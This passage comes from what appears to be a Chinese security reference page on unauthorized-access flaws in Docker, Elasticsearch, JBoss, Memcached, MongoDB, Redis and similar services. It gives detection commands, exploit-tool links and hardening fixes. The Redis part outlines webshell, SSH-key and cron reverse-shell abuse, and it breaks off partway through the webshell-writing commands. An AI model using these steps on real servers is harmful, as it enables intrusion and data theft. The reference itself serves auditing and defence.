<p>先用 nmap 扫描查看端口开放情况。<strong>2375</strong>为 docker 端口如果存在漏洞会有以下情况url 输入 ip:2375/version 就会列出基本信息也可以执行目标服务器容器命令如 container、image 等。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法">修复方法<a href="#修复方法" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 使用 TLS 认证。</p>
<p>(2) 网络访问控制Network Access Control</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="elasticsearch">Elasticsearch<a href="#elasticsearch" class="hash-link" aria-label="Elasticsearch的直接链接" title="Elasticsearch的直接链接">​</a></h2>
<ul>
<li>
<p>端口：9200、9300</p>
</li>
<li>
<p>介绍：ElasticSearch是一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口。Elasticsearch是用Java开发的，并作为Apache许可条款下的开放源码发布，是当前流行的企业级搜索引擎。Elasticsearch的增删改查操作全部由http接口完成。由于Elasticsearch授权模块需要付费，所以免费开源的Elasticsearch可能存在未授权访问漏洞。该漏洞导致，攻击者可以拥有Elasticsearch的所有权限。可以对数据进行任意操作。业务系统将面临敏感数据泄露、数据丢失、数据遭到破坏甚至遭到攻击者的勒索。</p>
<p>Elasticsearch服务普遍存在一个未授权访问的问题，攻击者通常可以请求一个开放9200或9300的服务器进行恶意攻击。</p>
</li>
<li>
<p>使用工具：浏览器直接访问如下地址</p>
<ul>
<li>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  http://101.198.161.xxx:9200/_cat/indices/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  http://101.198.161.xxx:9200/_plugin/head/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  http://101.198.161.xxx:9200/_nodes/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  http://101.198.161.xxx:9200/_status</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  http: //101.198.161.xxx:9200/_search?pretty</span><br></span></code></pre></div></div>
</li>
</ul>
</li>
<li>
<p>修复：参考 <a href="https://cloud.tencent.com/developer/article/1624456" target="_blank" rel="noopener noreferrer">ElasticSearch未授权访问漏洞修复方案</a></p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="hadoop">Hadoop<a href="#hadoop" class="hash-link" aria-label="Hadoop的直接链接" title="Hadoop的直接链接">​</a></h2>
<ul>
<li>
<p>端口：web访问，80等</p>
</li>
<li>
<p>介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理。</p>
</li>
<li>
<p>使用工具：</p>
<ul>
<li><a href="https://github.com/cwkiller/unauthorized-check" target="_blank" rel="noopener noreferrer">https://github.com/cwkiller/unauthorized-check</a></li>
<li><a href="https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py" target="_blank" rel="noopener noreferrer">https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py</a></li>
</ul>
</li>
<li>
<p>修复：</p>
<ul>
<li>如无必要，关闭Hadoop Web管理页面；</li>
<li>开启服务级别身份验证，如Kerberos认证；</li>
<li>部署Knox、Nginx之类的反向代理系统，防止未经授权用户访问；</li>
<li>设置“安全组”访问控制策略，将Hadoop默认开放的多个端口对公网全部禁止或限制可信任的IP地址才能访问包括50070以及WebUI等相关端口</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jenkins">Jenkins<a href="#jenkins" class="hash-link" aria-label="Jenkins的直接链接" title="Jenkins的直接链接">​</a></h2>
<ul>
<li>端口：web端口</li>
<li>介绍：未授权访问管理控制台,可以通过脚本命令行执行系统命令。通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。</li>
<li>使用工具：浏览器、<code>MSF</code></li>
<li>修复：<!-- -->
<ul>
<li>1、对后台控制页面做登录验证限制</li>
<li>2、升级版本</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jboss">JBOSS<a href="#jboss" class="hash-link" aria-label="JBOSS的直接链接" title="JBOSS的直接链接">​</a></h2>
<ul>
<li>端口：web端口</li>
<li>介绍：JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。,默认情况下访问 <a href="http://ip:8080/jmx-console" target="_blank" rel="noopener noreferrer">http://ip:8080/jmx-console</a> 就可以浏览 JBoss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</li>
<li>使用工具：<!-- -->
<ul>
<li>浏览器</li>
<li><a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener noreferrer">https://github.com/joaomatosf/jexboss</a></li>
<li><a href="https://github.com/xsr7yer/Web-Scan" target="_blank" rel="noopener noreferrer">https://github.com/xsr7yer/Web-Scan</a></li>
<li><a href="https://github.com/joaomatosf/JavaDeserH2HC" target="_blank" rel="noopener noreferrer">https://github.com/joaomatosf/JavaDeserH2HC</a></li>
</ul>
</li>
<li>修复：<!-- -->
<ul>
<li>对jmx控制页面访问添加访问验证。</li>
<li>进行JMX Console 安全配置。</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-1">漏洞信息<a href="#漏洞信息-1" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 <a href="http://ip/" target="_blank" rel="noopener noreferrer">http://ip:</a><strong>8080</strong>/jmx-console 就可以浏览 jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围JBOSS 全版本。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-1">检测方法<a href="#检测方法-1" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 <a href="http://ip/" target="_blank" rel="noopener noreferrer">http://ip<!-- -->:jboss</a>端口/ 看是否能进入 jmx-console 和 web-console 。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-1">修复方法<a href="#修复方法-1" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>JMX Console 安全配置</p>
<p>① 找到 <code>%JBOSS_HOME%/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml</code> 文件去掉下面这段 xml 文本的注释。</p>
<p><img decoding="async" loading="lazy" alt="https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426182248019-1571137611.png" src="/assets/images/1275435-20180426182248019-1571137611-27960fd04fc75cf7e308fbf960f357d0.png" width="810" height="229" class="img_ev3q"></p>
<p>② 与 jboss-web.xml 同级的目录下还有一个文件 web.xml找到下面这段 xml 文本把 GET 和 POST 两行注释掉同时 security-constraint 整个部分取消注释, <strong>不然存在head头绕过</strong>。</p>
<p><img decoding="async" loading="lazy" alt="https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426183107445-636697233.png" src="/assets/images/1275435-20180426183107445-636697233-a6056611402d54f3315c5fb8425fceb7.png" width="798" height="532" class="img_ev3q"></p>
<p>③ <code>%JBOSS_HOME%\server\default\conf\props\jbossws-users.properties</code> 中删除原始的 admin/admin添加新的用户名密码。</p>
<p><img decoding="async" loading="lazy" alt="https://images2018.cnblogs.com/blog/1275435/201804/1275435-20180426183714171-674693678.png" src="/assets/images/1275435-20180426183714171-674693678-b36366e7ed129c519b3795b515567367.png" width="795" height="140" class="img_ev3q"></p>
<p>④ <code>%JBOSS_HOME%\server\default\conf\props\jbossws-roles.properties</code> 中定义新用户名所属角色。该文件定义的格式为用户名 = 角色多个角色以 “,” 隔开该文件默认为 admin 用户定义了 JBossAdmin 和 HttpInvoker 这两个角色。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># A sample roles.properties file foruse with the UsersRolesLoginModule</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kermit = JBossAdmin,HttpInvoker</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="memcached">Memcached<a href="#memcached" class="hash-link" aria-label="Memcached的直接链接" title="Memcached的直接链接">​</a></h2>
<ul>
<li>端口：11211</li>
<li>介绍：Memcached是一套常用的key-value分布式高速缓存系统，由于其设计缺陷没有权限控制模块，若11211端口的服务对公网开放，攻击者无需授权即可通过命令访问Memcached中的敏感信息。</li>
<li>使用工具：<!-- -->
<ul>
<li><code>telnet</code>、<code>nc</code></li>
<li><a href="https://github.com/cwkiller/unauthorized-check" target="_blank" rel="noopener noreferrer">https://github.com/cwkiller/unauthorized-check</a></li>
<li><a href="https://github.com/aedoo/Memcache-Unauthorized" target="_blank" rel="noopener noreferrer">https://github.com/aedoo/Memcache-Unauthorized</a></li>
</ul>
</li>
<li>修复：<!-- -->
<ul>
<li>
<ol>
<li><code>vim /etc/sysconfig/memcached</code></li>
</ol>
</li>
<li>
<ol start="2">
<li><code>OPTIONS=&quot;-l 127.0.0.1&quot;</code> #设置本地为监听</li>
</ol>
</li>
<li>
<ol start="3">
<li><code>/etc/init.d/memcached restart</code> #重启服务</li>
</ol>
</li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-2">漏洞信息<a href="#漏洞信息-2" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述Memcached 是一套分布式高速缓存系统。它以 Key – Value 的形式将数据存储在内存中。这些数据通常是会被频繁地应用、读取的。正因为内存中数据的读取速度远远大于硬盘的读取速度所以可以用来加速应用的访问。由于 Memcached 的安全设计缺陷客户端连接 Memcached 服务器后无需认证就可读取、修改服务器缓存内容。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号CVE-2013-7239 。</p>
<p>(4) 影响范围Memcached 全版本。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-2">检测方法<a href="#检测方法-2" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>登录机器执行 netstat -an | more 命令查看端口监听情况。回显 0.0.0.0:<strong>11211</strong>11211 表示在所有网卡进行监听存在 Memcached 未授权访问漏洞。</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">telnet &lt;target&gt; 11211</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nc -vv &lt;target&gt; 11211</span><br></span></code></pre></div></div>
<p>提示连接成功表示漏洞存在。</p>
<p>使用端口扫描工具 nmap 进行远程扫描</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nmap -sV -p11211 --script memcached-info &lt;target&gt;</span><br></span></code></pre></div></div>
<p>修复方法</p>
<p>(1) 配置访问控制。建议用户不要将服务发布到互联网上以防被黑客利用而可以通过安全组规则或 Iptables 配置访问控制规则只允许内部必需的用户地址访问命令如下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A INPUT -p tcp -s 192.168.0.2 --dport 11211 -j ACCEPT</span><br></span></code></pre></div></div>
<p>(2) bind 指定监听 IP。如果 Memcached 没有在外网开放的必要可在 Memcached 启动时指定绑定的 IP 地址为 127.0.0.1。例如</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></span></code></pre></div></div>
<p>(3) 最小化权限运行。使用普通权限账号运行以下指定 memcached 用户运行</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</span><br></span></code></pre></div></div>
<p>(4) 修改默认端口。修改默认 11211 监听端口为 11222 端口</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pid</span><br></span></code></pre></div></div>
<p>(5) 备份数据。为避免数据丢失升级前应做好备份或建立硬盘快照。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="mongodb">MongoDB<a href="#mongodb" class="hash-link" aria-label="MongoDB的直接链接" title="MongoDB的直接链接">​</a></h2>
<ul>
<li>
<p>端口：27017</p>
</li>
<li>
<p>介绍：MongoDB服务安装后，默认未开启权限验证。如果服务监听在<code>0.0.0.0</code>，则可远程无需授权访问数据库；</p>
<ul>
<li>
<blockquote>
<p>3.0之前版本的MongoDB,默认监听在0.0.0.0，3.0及之后版本默认监听在127.0.0.1。</p>
<p>3.0之前版本，如未添加用户管理员账号及数据库账号，使用<code>--auth</code>参数启动时，在本地通过127.0.0.1仍可无需账号密码登陆访问数据库，远程访问则提示需认证；
3.0及之后版本，使用<code>--auth</code>参数启动后，无账号则本地和远程均无任何数据库访问权限。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>使用工具：<code>MSF</code>、<code>navicat</code>、<code>nc</code>、<code>各种mongodb客户端</code></p>
</li>
<li>
<p>修复：参考 <a href="https://www.longkui.site/program/development/mongodb/3627/" target="_blank" rel="noopener noreferrer">mongoDB设置用户名密码</a></p>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-3">漏洞信息<a href="#漏洞信息-3" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述开启 MongoDB 服务时若不添加任何参数默认是没有权限验证的而且可以远程访问数据库登录的用户无需密码即可通过默认端口 **27017 **对数据库进行增、删、改、查等高危操作。刚安装完毕时MongoDB 都默认有一个 admin 数据库此时 admin 数据库为空没有记录权限相关的信息。当 admin.system.users 一个用户都没有时即使 MongoDB 启动时添加了 –auth 参数还是可以做任何操作不管是否以 –auth 参数启动直到在 admin.system.users 中添加了一个用户。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围MongoDB 数据库。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="检测方法-3">检测方法<a href="#检测方法-3" class="hash-link" aria-label="检测方法的直接链接" title="检测方法的直接链接">​</a></h3>
<p>可以自己编制相应脚本或利用专用工具检测也可以查看配置文件</p>
<p>(1) 检测是否仅监听 127.0.0.1</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">--bind_ip 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vim /etc/mongodb.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bind_ip = 127.0.0.1</span><br></span></code></pre></div></div>
<p>(2) 检测是否开启 auth 认证</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mongo 目标ip:端口号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show dbs；#列出有哪些数据库，数据库占用了多大的存储空间。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db；#当前连接的是哪个数据库</span><br></span></code></pre></div></div>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mongod --auth</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">or</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vim /etc/mongodb.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">auth = true</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="修复方法-2">修复方法<a href="#修复方法-2" class="hash-link" aria-label="修复方法的直接链接" title="修复方法的直接链接">​</a></h3>
<p>(1) 为 MongoDB 添加认证</p>
<p>① MongoDB 启动时添加 -auth 参数。</p>
<p>② 给 MongoDB 添加用户</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use admin # 使用 admin 库</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db.addUser“用户名” “密码”# 添加用户名、密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">db.auth“用户名”,“密码”# 验证是否添加成功返回 1 说明成功。</span><br></span></code></pre></div></div>
<p>(2) 禁用 HTTP 和 REST 端口</p>
<p>MongoDB 自身带有一个 HTTP 服务并支持 REST 接口。在 2.6 版本以后这些接口默认关闭。MongoDB 默认会使用默认端口监听 Web 服务一般不需要通过 Web 方式进行远程管理建议禁用。修改配置文件或在启动时选择 -nohttpinterface 参数 nohttpinterface = false。</p>
<p>(3) 限制绑定 IP</p>
<p>启动时加入参数</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">--bind_ip 127.0.0.1</span><br></span></code></pre></div></div>
<p>或在 /etc/mongodb.conf 文件中添加以下内容</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bind_ip = 127.0.0.1</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="mysql">Mysql<a href="#mysql" class="hash-link" aria-label="Mysql的直接链接" title="Mysql的直接链接">​</a></h2>
<ul>
<li>端口:3306</li>
<li>介绍：未授权访问，可读取数据库中的数据，可尝试在web路径下写webshell，udf提权等</li>
<li>使用工具：<code>MSF</code>、<code>navicat</code>、<code>各种mysql客户端</code></li>
<li>修复：参考 <a href="http://c.biancheng.net/view/7152.html" target="_blank" rel="noopener noreferrer">MySQL修改密码的3种方式</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="nfs">nfs<a href="#nfs" class="hash-link" aria-label="nfs的直接链接" title="nfs的直接链接">​</a></h2>
<ul>
<li>
<p>端口：2049</p>
</li>
<li>
<p>介绍：配置不当时，可以远程挂载nfs的共享目录</p>
</li>
<li>
<p>使用工具：</p>
<ul>
<li>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">apt</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> nfs-common 安装nfs客户端</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  showmount </span><span class="token parameter variable" style="color:#36acaa">-e</span><span class="token plain"> xx.xx.xx.xx 查看nfs服务器上的共享目录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">mount</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-t</span><span class="token plain"> nfs xx.xx.xx.xx:/grdata /mnt 挂载到本地</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">umount</span><span class="token plain"> /mnt 卸载目录</span><br></span></code></pre></div></div>
</li>
</ul>
</li>
<li>
<p>修复：在/etc/exports下对所需要共享的文件进行访问控制</p>
<ul>
<li><code>/home export 172.19.104.6(rw,async,no_root_squash) #仅允许172.19.104.6访问该目录。</code></li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="redis">Redis<a href="#redis" class="hash-link" aria-label="Redis的直接链接" title="Redis的直接链接">​</a></h2>
<ul>
<li>
<p>端口：6379</p>
</li>
<li>
<p>介绍：Redis 低版本默认情况下，会绑定在 <code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p>
</li>
<li>
<p>利用方式：</p>
<ul>
<li>
<p>写文件</p>
<ul>
<li>写公钥</li>
<li>写计划任务</li>
<li>写webshell</li>
</ul>
</li>
<li>
<p>主从复制RCE</p>
</li>
</ul>
</li>
<li>
<p>使用工具</p>
<ul>
<li><code>MSF</code></li>
<li><a href="https://github.com/Ridter/redis-rce" target="_blank" rel="noopener noreferrer">https://github.com/Ridter/redis-rce</a></li>
<li><a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener noreferrer">https://github.com/n0b0dyCN/redis-rogue-server</a></li>
</ul>
</li>
<li>
<p>修复：参考 <a href="https://www.cnblogs.com/suanshun/p/7699084.html" target="_blank" rel="noopener noreferrer">Redis 密码设置和查看密码</a></p>
</li>
<li>
<p>其他：</p>
<ul>
<li><a href="https://www.ddosi.org/redis-ssh/" target="_blank" rel="noopener noreferrer">Redis常见漏洞利用方法总结|Redis未授权访问漏洞利用方式</a></li>
</ul>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞信息-4">漏洞信息<a href="#漏洞信息-4" class="hash-link" aria-label="漏洞信息的直接链接" title="漏洞信息的直接链接">​</a></h3>
<p>(1) 漏洞简述Redis 是一个高性能的 Key – Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。Redis 默认情况下会绑定在 0.0.0.0:<strong>6379</strong>这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法成功地在 Redis 服务器上写入公钥进而可以使用对应私钥直接登录目标服务器。</p>
<p>(2) 风险等级高风险。</p>
<p>(3) 漏洞编号无。</p>
<p>(4) 影响范围Redis 数据库。</p>
<p>检测方法</p>
<p>先用 nmap 扫描查看端口开放情况发现开放的 6379 端口为 Redis 的默认端口</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Nmap -A -p 6379 --script redis-info 192.168.10.153</span><br></span></code></pre></div></div>
<p>Nmap 扫描后发现主机的 6379 端口对外开放可以通过 Redis 客户端进行连接测试是否存在未授权访问漏洞具体命令如下</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./redis-cli -h 192.168.10.153</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Info</span><br></span></code></pre></div></div>
<p>就可以看到 Redis 的版本和服务器上内核的版本信息也可以 del key 删除数据在网站写入木马写入 SSH 公钥或者在 crontab 里写定时任务反弹 shell 等。</p>
<p>(1) 网站写码</p>
<p>① 先用客户端连接服务器的 redis 服务</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">redis-cli.exe -h 目标IP</span><br></span></code></pre></div></div>
<p>② 连接后设置目录</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">config set dir /var/www/html此路径是服务器端 Web 网站的目录</span><br></span></code></pre></div></div>
<p>③ 设置要写入的文件名</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">config set dbfilename redis88.php</span><br></span></code></pre></div></div>
<p>④ 设置要写入的内容</p>
